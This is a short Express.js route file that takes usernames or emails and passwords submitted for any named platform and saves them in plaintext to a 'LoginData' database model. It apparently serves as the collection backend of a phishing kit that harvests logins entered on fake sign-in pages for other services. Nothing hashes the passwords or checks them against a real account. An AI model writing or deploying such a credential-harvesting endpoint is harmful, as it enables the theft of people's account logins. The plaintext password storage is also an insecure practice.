const express = require("express");
const router = express.Router();

const LoginData = require("../models/LoginData");

router.post("/:platform", async (req, res) => {
  const platform = req.params.platform.toLowerCase();
  const { username, email, password } = req.body;

  if (!password) {
    return res.status(400).json({ message: "Password is required." });
  }

  // For username field, try username first, then email fallback
  const userIdentifier = username || email;

  if (!userIdentifier) {
    return res.status(400).json({ message: "Username or Email is required." });
  }

  try {
    const login = new LoginData({
      username: userIdentifier,
      password,
      platform,
      createdAt: new Date(),
    });

    await login.save();

    res.status(200).json({ message: `${platform} login data saved successfully.` });
  } catch (error) {
    console.error(`Error saving ${platform} login data:`, error);
    res.status(500).json({ message: "Server error." });
  }
});

module.exports = router;
